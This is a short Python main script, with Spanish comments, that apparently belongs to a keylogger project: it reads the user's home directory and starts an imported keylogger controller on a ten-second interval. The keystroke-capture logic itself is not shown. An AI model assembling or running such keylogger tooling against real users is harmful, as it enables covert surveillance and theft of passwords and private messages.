from controller.FileSystemController import FileSystemController
from controller.KeyloggerController import KeyloggerController

if __name__ == "__main__":
    fs_controller = FileSystemController()
    ruta_home_usuario = fs_controller.get_home()

    # Iniciamos el Keylogger [OK]
    keylogger = KeyloggerController(interval=10)
    keylogger.start()